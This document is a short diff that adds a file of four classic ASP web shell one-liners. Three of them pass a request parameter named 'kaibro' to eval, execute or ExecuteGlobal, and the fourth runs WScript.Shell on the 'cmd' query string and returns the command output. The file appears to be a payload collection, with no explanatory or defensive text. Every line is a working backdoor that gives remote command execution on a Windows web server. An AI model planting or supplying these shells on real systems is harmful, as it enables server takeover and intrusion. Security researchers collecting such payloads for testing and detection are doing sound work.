@@ -1,0 +1,7 @@
+<%eval request("kaibro")%>
+
+<%execute request("kaibro")%>
+
+<%ExecuteGlobal request("kaibro")%>
+
+<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.Readall()%>
